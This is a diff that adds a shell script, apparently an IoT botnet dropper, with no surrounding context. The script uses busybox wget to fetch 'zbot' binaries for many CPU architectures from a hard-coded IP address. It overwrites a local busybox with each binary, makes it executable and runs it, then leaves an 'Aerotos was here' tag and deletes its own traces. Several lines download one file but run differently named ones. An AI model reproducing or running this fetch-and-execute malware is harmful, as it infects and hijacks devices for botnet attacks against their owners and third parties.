@@ -1,0 +1,27 @@
+#!/bin/sh
+/bin/busybox cp /bin/busybox ./ /bin/busybox wget 
+http://23.95.91.156/zbotmipsel ; /bin/busybox cat zbotmipsel > busybox ; 
+/bin/busybox rm zbotmipsel; /bin/busybox chmod 777 busybox ; ./busybox 
+/bin/busybox wget http://23.95.91.156/zbotmips ; /bin/busybox cat 
+zbotmips > busybox ; /bin/busybox rm zbotmips; /bin/busybox chmod 777 
+busybox ; ./busybox /bin/busybox wget http://23.95.91.156/zbotmipsel ; 
+/bin/busybox cat zbotsh4 > busybox ; /bin/busybox rm zbotsh4; 
+/bin/busybox chmod 777 busybox ; ./busybox /bin/busybox wget 
+http://23.95.91.156/zbotmipsel ; /bin/busybox cat zbotx86 > busybox ; 
+/bin/busybox rm zbotx86; /bin/busybox chmod 777 busybox ; ./busybox 
+/bin/busybox wget http://23.95.91.156/zbotmipsel ; /bin/busybox cat 
+zbotarmv6 > busybox ; /bin/busybox rm zbotarmv6; /bin/busybox chmod 777 
+busybox ; ./busybox /bin/busybox wget http://23.95.91.156/zbotmipsel ; 
+/bin/busybox cat zboti686 > busybox ; /bin/busybox rm zboti686; 
+/bin/busybox chmod 777 busybox ; ./busybox /bin/busybox wget 
+http://23.95.91.156/zbotmipsel ; /bin/busybox cat zbotpowerpc > busybox 
+; /bin/busybox rm zbotpowerpc; /bin/busybox chmod 777 busybox ; 
+./busybox /bin/busybox wget http://23.95.91.156/zbotmipsel ; 
+/bin/busybox cat zboti586 > busybox ; /bin/busybox rm zboti586; 
+/bin/busybox chmod 777 busybox ; ./busybox /bin/busybox wget 
+http://23.95.91.156/zbotmipsel ; /bin/busybox cat zbotm86k > busybox ; 
+/bin/busybox rm zbotm86k; /bin/busybox chmod 777 busybox ; ./busybox 
+/bin/busybox wget http://23.95.91.156/zbotmipsel ; /bin/busybox cat 
+zbotsparc > busybox ; /bin/busybox rm zbotsparc; /bin/busybox chmod 777 
+busybox ; ./busybox /bin/busybox echo Aerotos was here.
+/bin/busybox rm * $0 busybox
